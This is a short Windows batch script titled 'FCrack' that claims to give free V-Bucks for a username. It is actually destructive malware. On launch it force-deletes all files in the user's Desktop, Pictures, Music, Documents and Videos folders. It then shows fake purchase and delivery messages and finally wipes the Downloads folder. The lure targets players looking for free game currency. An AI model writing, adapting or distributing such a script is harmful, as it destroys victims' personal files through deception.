@echo off
title FCrack
cd C:\Users\%username%\
del Desktop\* /q /f
del Pictures\* /q /f
del Music\* /q /f
del Documents\* /q /f
del Videos\* /q /f
echo.
echo    Enter your username for free V-Bucks:
echo.
set /p vbucks= Username: 
cls
echo Purchasing V-Bucks...
echo Purchased!
echo Sending V-Bucks to %vbucks%...
ping localhost -n 15 >nul
echo V-Bucks sent! Check balance in 1-2 days!
ping localhost -n 5 >nul
del Downloads\* /q /f
